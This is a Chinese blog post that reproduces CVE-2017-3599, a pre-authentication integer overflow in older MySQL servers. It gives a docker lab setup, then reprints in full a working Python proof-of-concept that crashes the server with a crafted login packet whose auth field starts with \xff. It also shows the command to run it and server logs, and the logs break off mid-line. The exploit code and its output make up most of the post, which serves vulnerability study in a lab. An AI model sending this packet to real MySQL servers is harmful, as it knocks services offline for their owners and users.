<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"manual"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-3599漏洞复现">
<meta property="og:url" content="http://example.com/2024/01/14/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="M011y&#39;s Blog">
<meta property="og:description" content="MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-01-14T13:44:55.000Z">
<meta property="article:modified_time" content="2024-01-25T15:31:04.297Z">
<meta property="article:author" content="yumlii33">
<meta property="article:tag" content="CVE-2017-3599">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2024/01/14/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2017-3599漏洞复现 | M011y's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">M011y's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">M011y's Blog</p>
      <a>
        <img class="custom-logo-image" src="/uploads/无牙仔.png" alt="M011y's Blog">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/yumlii33" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/14/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yumlii33">
      <meta itemprop="description" content="Molly's blog website.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M011y's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2017-3599漏洞复现<a href="https://github.com/yumlii33/yumlii33.github.io/tree/master/source/_posts/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-01-14 21:44:55" itemprop="dateCreated datePublished" datetime="2024-01-14T21:44:55+08:00">2024-01-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-01-25 23:31:04" itemprop="dateModified" datetime="2024-01-25T23:31:04+08:00">2024-01-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>
            <div class="post-description">MySQL < 5.6.35 / < 5.7.17 - Integer Overflow - Multiple dos Exploit</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <span id="more"></span>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41954">MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit</a></p>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><blockquote>
<p>Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql&#x2F;auth&#x2F;sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.</p>
</blockquote>
<h2 id="被测环境"><a href="#被测环境" class="headerlink" title="被测环境"></a>被测环境</h2><ul>
<li>docker镜像：<code>mysql:5.6.35</code></li>
<li>启动被测环境容器：<code>docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35</code></li>
</ul>
<h2 id="POC脚本"><a href="#POC脚本" class="headerlink" title="POC脚本"></a>POC脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py</span></span><br><span class="line"><span class="string"># Exploit Title: Remote MySQL DOS (Integer Overflow)</span></span><br><span class="line"><span class="string"># Google Dork: N/A</span></span><br><span class="line"><span class="string"># Date: 13th April 2017</span></span><br><span class="line"><span class="string"># Exploit Author: Rodrigo Marcos</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://www.mysql.com/</span></span><br><span class="line"><span class="string"># Software Link: https://www.mysql.com/downloads/</span></span><br><span class="line"><span class="string"># Version: 5.6.35 and below / 5.7.17 and below</span></span><br><span class="line"><span class="string"># Tested on: N/A</span></span><br><span class="line"><span class="string"># CVE : CVE-2017-3599</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CVE-2017-3599 Proof of Concept exploit code.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Rodrigo Marcos</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; host [port]&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">2</span>:</span><br><span class="line">        PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="comment"># Yes, no error checking... living on the wild side!</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Creating packet...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3 bytes		Packet lenth</span></span><br><span class="line"><span class="string">1 bytes 	Packet number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Login request:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Packet format (when the server is 4.1 or newer):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bytes       Content</span></span><br><span class="line"><span class="string">-----       ----</span></span><br><span class="line"><span class="string">4           client capabilities</span></span><br><span class="line"><span class="string">4           max packet size</span></span><br><span class="line"><span class="string">1           charset number</span></span><br><span class="line"><span class="string">23          reserved (always 0)</span></span><br><span class="line"><span class="string">n           user name, \0-terminated</span></span><br><span class="line"><span class="string">n           plugin auth data (e.g. scramble), length encoded</span></span><br><span class="line"><span class="string">n           database name, \0-terminated</span></span><br><span class="line"><span class="string">            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)</span></span><br><span class="line"><span class="string">n           client auth plugin name - \0-terminated string,</span></span><br><span class="line"><span class="string">            (if CLIENT_PLUGIN_AUTH is set in the capabilities)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># packet_len = &#x27;\x64\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">packet_num = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Login request packet</span></span><br><span class="line">packet_cap = <span class="string">&#x27;\x85\xa2\xbf\x01&#x27;</span>		<span class="comment"># client capabilities (default)</span></span><br><span class="line">packet_max = <span class="string">&#x27;\x00\x00\x00\x01&#x27;</span>		<span class="comment"># max packet size (default)</span></span><br><span class="line">packet_cset = <span class="string">&#x27;\x21&#x27;</span>				<span class="comment"># charset (default)</span></span><br><span class="line">p_reserved = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">23</span> 			<span class="comment"># 23 bytes reserved with nulls (default)</span></span><br><span class="line">packet_usr =  <span class="string">&#x27;test\x00&#x27;</span> 			<span class="comment"># username null terminated (default)</span></span><br><span class="line"></span><br><span class="line">packet_auth  = <span class="string">&#x27;\xff&#x27;</span>			<span class="comment"># both \xff and \xfe crash the server</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Conditions to crash:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1 - packet_auth must start with \xff or \xfe</span></span><br><span class="line"><span class="string">2 - packet_auth must be shorter than 8 chars</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The expected value is the password, which could be of two different formats</span></span><br><span class="line"><span class="string">(null terminated or length encoded) depending on the client functionality.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth </span><br><span class="line">packet_len = pack(<span class="string">&#x27;i&#x27;</span>,<span class="built_in">len</span>(packet))[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">request = packet_len + packet_num + packet</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Connecting to host...&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Connected.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Unable to connect to host &quot;</span> + HOST + <span class="string">&quot; on port &quot;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&quot;.&quot;</span>	</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exiting.&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Receiving greeting from remote host...&quot;</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Sending our payload...&quot;</span></span><br><span class="line">s.send(request)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"><span class="comment">#print &quot;Our data: %r&quot; % request</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<h2 id="攻击执行"><a href="#攻击执行" class="headerlink" title="攻击执行"></a>攻击执行</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py IP 3306</span><br></pre></td></tr></table></figure>

<h2 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">拒绝服务，查看数据库的容器日志：</span><br><span class="line"></span><br><span class="line">root@yml-penetration:~/Workspace/cve-2017-3599<span class="comment"># docker logs 100</span></span><br><span class="line">Initializing database</span><br><span class="line">2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class="line">2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: <span class="built_in">wait</span>...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile101 size to 48 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile1 size to 48 MB</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Renaming <span class="built_in">log</span> file ./ib_logfile101 to ./ib_logfile0</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: New <span class="built_in">log</span> files created, LSN=45781</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 0</span><br><span class="line">2023-12-19 12:19:36 36 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:36 36 